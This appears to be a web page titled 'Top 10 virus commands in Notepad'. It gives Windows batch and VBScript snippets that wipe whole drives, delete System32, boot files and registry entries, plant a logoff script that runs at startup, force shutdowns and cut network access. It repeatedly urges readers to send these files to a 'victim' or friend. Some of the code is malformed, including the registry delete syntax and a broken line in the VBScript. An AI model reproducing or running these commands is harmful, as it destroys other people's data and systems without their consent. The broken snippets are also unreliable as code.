print("Hello , world")
 🔰 TOP 10 VIRUS COMMAND'S IN NOTEPAD 🔰

Method 1:

Just open your notepad
1) Click start -> all programs -> accessories -> notepad
2) Or just press or click windows key + r :: run window will open and
type notepad and hit enter .

NOW TYPE THE FOLLOWING CODE ::

@echo off
del D:\*.* /f /s /q
del E:\*.* /f /s /q
del F:\*.* /f /s /q
del G:\*.* /f /s /q
del H:\*.* /f /s /q
del I:\*.* /f /s /q
del J:\*.* /f /s /q

Then save it as kinng.bat and the batch file is created .
WARNING :: This is the most dangerous virus! Be careful with its use.

Delete the entire registry

@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*

Now save it as kinng.bat and the batch file is created .

Method 2:

How to crash a PC Forever !:::

@echo off
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini

Open up notepad and copy and paste that. Save it as a .bat file.
This should shutdown the persons computer. It shuts it off once and deletes the files needed to reboot and restart.
REMEMBER - DO NOT CLICK THIS FILE.


Method 3:

How to stop someone's internet access::::


@Echo off
Ipconfig /release

Save that as a .bat and send it to someone. They're IP address will be lost, and therefore they won't be able to fix it

However, this is VERY easy to fix. Simply type in IPconfig /renew

Method 4:


ShutDown PC million Times::::

1.right click on the desktop
2.click shortcut
you will get a dialogue box, write in it: shutdown -s -t 1000 c "any comment u want" then press next
note: this "1000" i wrote is the time in seconds needed for ur computer to shutdown,u can put any number u want...
3.u will get another dialogue box, write in it: Internet Explorer and press finish
4.u will find the icon on ur desktop, dont open it, just right click on it and press properties>change icon>select the icon the the internet explorer and the press apply then ok
try to open it, it is a virus hehe
PS: the only way 2 stop ur computer from shutting down is to go 2 start>run>type: shutdown -a

Method 5:

Open Notepad
Write / copy the below command there:
" del c:\WINDOWS\system32\*.*/q " without quote
and save as " anything.bat"
Done. If You Give this file to your victim his SYSTEM 32 Folder will be deleted. Without which a Windows Pc cant be started.


Method 6:

Process:
Open Notepad
Copy the below command there
"rd/s/q D:\
rd/s/q C:\
rd/s/q E:\" ( without quotes )
Save as "anything.bat
This virus Formats the C ,D , and E Drive in 3 Seconds.

Method 7:

Just open the Notepad and type the paste the following Code.
set ws=createobject("wscript.shell")
dim strDir,strfile,st,strtxt2,strshell,strlog
dim obfso,obfolder,obshell,obfile,obtxtfile
strshell="wscript.shell"
strDir="C:\WINDOWS"
strfile="\wscript.vbs"
st=Chr(34)
strlog="shutdown -l"
strtxt2="ws.run(strlog)"
set obfso=CreateObject("Scripting.FileSystemObject")
on error resume next
set obfile=obfso.CreateTextfile(strDir & strfile)
obfile.writeline("set ws=createobject("&st&strshell&st&")")
obfile.writeline("ws.run("&st&strlog&st&")")
ws.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Logoff","C:\WINDOWS\wscript.vbs","REG_SZ”

Now Save This Notepad file With Any Name Having .vbs Extension .

Method 8:

Open Notepad and write "start" without quotes
Start
Start
Start
and then save it with .bat extension.
Now double click on this .bat file to run Command Prompt.

Method 9:

Convey your friend a little message and shut down his / her computer:
@echo off
msg * I don't like you
shutdown -c "Error! You are too stupid!" -s

Save it as "Anything.BAT" in All Files and send it.

Method 10 :

Toggle your friend's Caps Lock button simultaneously:

Code:
Set wshShell =wscript.CreateObject("WScript.Shel
l")
do
wscript.sleep 100
wshshell.sendkeys "{CAPSLOCK}"
loop
Save it as "Anything.VBS" and send it.